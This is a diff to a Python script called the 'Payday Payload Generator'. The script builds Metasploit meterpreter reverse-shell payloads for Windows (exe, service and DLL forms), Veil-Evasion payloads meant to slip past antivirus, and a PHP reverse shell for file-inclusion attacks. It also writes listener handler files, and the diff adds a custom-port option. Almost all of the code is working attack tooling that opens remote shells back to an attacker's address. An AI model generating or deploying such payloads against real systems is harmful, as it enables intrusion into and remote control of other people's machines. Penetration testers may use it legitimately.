@@ -1,6 +1,7 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 # Author : Matt Lorentzen
-# version 0.4
+
 
 import os, sys, time, argparse
 
@@ -22,18 +23,51 @@ def banner():
 	print redtxt(banner)
 
 
-def msf_payloads(ip, output_dir):
+def build_tree():
+	tree_structure = """
+The following structure is needed for veil output
+
+  payloads
+  ├── veil
+  │   ├── catapult
+  │   ├── pillage
+  │   └── source
+  └── windows
+      └── handlers
+"""
+	print greentxt(tree_structure)
+
+
+
+def parse_veil_config():
+	""" Loads Veil Configuration file options from /etc/veil/settings.py """
+	# check for veil settings file
+	if not os.path.isfile('/etc/veil/settings.py'):
+		print redtxt("[!] Cannot find the veil settings file. Please check Veil installation.")
+	else:
+		vf = open('/etc/veil/settings.py', 'r')
+		for line in vf.readlines():
+			if not line.startswith('#'):
+				if "PAYLOAD" in line:
+					print line.strip()
+		print "\n"
+		vf.close()
+
+
+# ----- [ Creating Payloads ] ----- #
+
+
+def msf_payloads(ip, output_dir, payload_port):
 	# Payloads Dictionary
 	payloads = []
-
-	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "revmet.exe"])
-	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "revmet64.exe"])
-	payloads.append(["windows/meterpreter/reverse_http",443, "exe", "methttp.exe"])
-	payloads.append(["windows/meterpreter/reverse_https",443, "exe", "methttps.exe"])
-	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "exe-service" , "serv64.exe"])
-	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe-service" ,"serv.exe"])
-	payloads.append(["windows/meterpreter/reverse_tcp",443, "dll", "revmetdll.dll"])
-	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "dll", "revmetdll64.dll"])
+	payloads.append(["windows/meterpreter/reverse_tcp",payload_port, "exe", "revmet.exe"])
+	payloads.append(["windows/x64/meterpreter/reverse_tcp", payload_port, "exe", "revmet64.exe"])
+	payloads.append(["windows/meterpreter/reverse_http",payload_port, "exe", "methttp.exe"])
+	payloads.append(["windows/meterpreter/reverse_https",payload_port, "exe", "methttps.exe"])
+	payloads.append(["windows/x64/meterpreter/reverse_tcp",payload_port, "exe-service" , "serv64.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp",payload_port, "exe-service" ,"serv.exe"])
+	payloads.append(["windows/meterpreter/reverse_tcp",payload_port, "dll", "revmetdll.dll"])
+	payloads.append(["windows/x64/meterpreter/reverse_tcp",payload_port, "dll", "revmetdll64.dll"])
 
 	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
 
@@ -46,6 +80,7 @@ def msf_payloads(ip, output_dir):
 		base = output_dir
 		venom_cmd = "msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + lport + " -f " + output_type + " -o " + base + ext
 		print "[!] Generating : " + bluetxt(payload)
+		print "[>] LHOST " + greentxt(ip) + " on port " + greentxt(lport)
 		os.system(venom_cmd)
 		print "[!] Generating handler for : " + bluetxt(payload)
 		# strip off ext and replace with .rc
@@ -54,7 +89,7 @@ def msf_payloads(ip, output_dir):
 		handler_file = open(base + "handlers/" + handler , "w")
 		handler_file.write("use exploit/multi/handler\n")
 		handler_file.write("set payload " + payload +"\n")
-		handler_file.write("set LPORT 443\n")
+		handler_file.write("set LPORT " + str(payload_port) + "\n")
 		handler_file.write("set LHOST " + ip + "\n")
 		handler_file.write("set ExitOnSession False\n")
 		handler_file.write("exploit -j -z\n")
@@ -62,16 +97,16 @@ def msf_payloads(ip, output_dir):
 		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
 
 
-def veil_payloads(ip, output_dir, move_payloads, veil_script):
+def veil_payloads(ip, output_dir, move_payloads, veil_script, payload_port):
 	""" Takes local IP address as LHOST parm and builds Veil payloads"""
 	# Veil doesn't have a custom output directory option and the default path gets pulled from the config file
 	# hacky approach :: copy each generated payload and handler in to the custom output directory if it is supplied
 	# start empty list to hold
 	payloads = []
 	# appends payloads with nested 3 value list for dynamic parm calling
-	payloads.append(["cs/meterpreter/rev_https", 443, "veil_rev_https"])
-	payloads.append(["c/meterpreter/rev_tcp",443,"veil_rev_tcp_met"])
-	payloads.append(["c/meterpreter/rev_http_service",443, "veil_rev_http_srv"])
+	payloads.append(["cs/meterpreter/rev_https",payload_port, "veil_rev_https"])
+	payloads.append(["c/meterpreter/rev_tcp",payload_port,"veil_rev_tcp_met"])
+	payloads.append(["c/meterpreter/rev_http_service",payload_port, "veil_rev_http_srv"])
 
 
 	print "Creating Veil Goodness"
@@ -93,10 +128,10 @@ def veil_payloads(ip, output_dir, move_payloads, veil_script):
 			# move handler
 			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")
 
-def php_payloads(ip, output_dir):
+def php_payloads(ip, output_dir, payload_port):
 	""" Creates PHP based raw shell and outputs as txt ready for RFI """
 	payloads = []
-	payloads.append(["php/meterpreter/reverse_tcp", 443, "raw" ,"pshell.txt"])
+	payloads.append(["php/meterpreter/reverse_tcp", payload_port, "raw" ,"pshell.txt"])
 	# TODO : push out the payload generation to a dedicated function to remove the code duplication
 	for parms in payloads:
 		lhost = ip
@@ -207,7 +242,7 @@ def bluetxt(text2colour):
 
 def Main():
 	# program version
-	version = 0.5
+	version = 0.6
 	banner()
 	default_path = '/root/payloads/windows'
 	veil_script = '/root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py'
@@ -215,16 +250,15 @@ def Main():
 	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
 	parser.add_argument("--msf", action="store_true", help='MSF Payloads > tcp/exe, tcp/http(s), exe-service, dll')
+	parser.add_argument("--port", help='Specify custom port for payloads. Defaults to 443')	
 	parser.add_argument("--php", action="store_true", help='Creates PHP payload as txt file for LFI/RFI')
 	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
 	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
-	
 
 	# counts the supplied number of arguments and prints help if they are missing
 	if len(sys.argv)==1:
 		parser.print_help()
-			
 		sys.exit(1)
 
 	args = parser.parse_args()
@@ -233,7 +267,15 @@ def Main():
 	ip = args.ip
 	output_dir = ""
 	move_payloads = False
+	payload_port = ""
+	
+	# port option override
+	if args.port:
+		payload_port = args.port
+	else:
+		payload_port = 443
 
+	
 	# set up default path
 	if args.output:
 		output = args.output
@@ -247,6 +289,9 @@ def Main():
 		if not os.path.isdir(output_dir):
 			print bluetxt("[*] The default path : %s is missing") %output_dir
 			print yellowtxt("[!] You need to create this default path")
+			build_tree()
+			print "The following paths are configured in '/etc/veil/settings.py', these are the default output directories for veil payloads."
+			parse_veil_config()
 			sys.exit(1)
 			#os.mkdir(output_dir)
 			#os.chdir(output_dir)
@@ -257,7 +302,7 @@ def Main():
 			print "[!] IP address required with this payload option :: --veil --ip <Address>"
 		else:
 			print yellowtxt("[!] Encoding Veil payloads")
-			veil_payloads(ip ,output_dir, move_payloads, veil_script)
+			veil_payloads(ip ,output_dir, move_payloads, veil_script, payload_port)
 
 
 	if args.msf:
@@ -265,7 +310,7 @@ def Main():
 			print "[!] IP address required with this payload option :: --msf --ip <Address>"
 		else:
 			print yellowtxt("[!] Encoding MSF Payloads")
-			msf_payloads(ip, output_dir)
+			msf_payloads(ip, output_dir, payload_port)
 
 
 	if args.php:
@@ -273,7 +318,7 @@ def Main():
 			print "[!] IP address required with this payload option :: --php --ip <Address>"
 		else:
 			print yellowtxt("[!] Encoding PHP Payloads")
-			php_payloads(ip, output_dir)
+			php_payloads(ip, output_dir, payload_port)
 
 
 
